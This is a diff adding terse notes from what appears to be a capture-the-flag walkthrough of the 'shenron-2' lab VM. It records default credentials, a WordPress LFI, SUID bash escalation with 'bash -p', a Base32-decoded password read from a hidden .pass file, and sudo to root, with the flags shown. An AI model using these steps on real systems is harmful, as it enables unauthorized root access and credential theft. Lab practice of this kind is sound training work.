@@ -1,0 +1,64 @@
+user
+jenny
+shenron
+
+Wordpress-->
+LFI
+admin:admin
+
+SSH
+jenny:jenny
+
+
+/usr/bin/Execute
+
+/mnt/bash -p
+
+
+bash-5.0$ cat local.txt 
+40252f8ffc3932fd2b5ae4995defb92
+bash-5.0$ cat .pass 
+KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK
+bash-5.0$ 
+
+from Base32
+shenron:ShEnRoNShEnRoNShEnRoNShEnRoNShEnRoN@ShEnRoN#ShEnRoNPaSsWoRd
+
+
+shenron@shenron-2:~$ sudo -l                                                                                       
+[sudo] password for shenron:                                                                                       
+Matching Defaults entries for shenron on shenron-2:                                                                
+    env_reset, mail_badpass,                                                                                       
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                       
+                                                                                                                   
+User shenron may run the following commands on shenron-2:                                                          
+    (ALL : ALL) ALL                                                                                                
+shenron@shenron-2:~$                                                                                               
+shenron@shenron-2:~$                                                                                               
+shenron@shenron-2:~$ sudo su -
+root@shenron-2:~# cd /root/
+root@shenron-2:~# ll
+total 48
+drwx------  5 root root  4096 Apr  6 00:43 ./
+drwxr-xr-x 20 root root  4096 Apr  2 01:39 ../
+-rw-------  1 root root     5 Apr  6 00:43 .bash_history
+-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
+drwx------  3 root root  4096 Apr  5 18:53 .cache/
+drwxr-xr-x  3 root root  4096 Apr  5 18:53 .config/
+drwxr-xr-x  3 root root  4096 Apr  5 18:53 .local/
+-rw-r--r--  1 root root   161 Dec  5  2019 .profile
+-rw-r--r--  1 root root   508 Apr  3 23:47 root.txt
+-rw-------  1 root root 12176 Apr  5 20:14 .viminfo
+root@shenron-2:~# cat root.txt 
+                                                               
+  mmmm  #                                                 mmmm 
+ #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
+ "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #             m"
+     "# #   #  #""""  #   #   #     #   #  #   #   """     m"  
+ "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         m#mmmm
+                                                               
+Your Root Flag Is Here :- a89604e285437f789ff278d2239aea02
+
+root@shenron-2:~# 
+
+
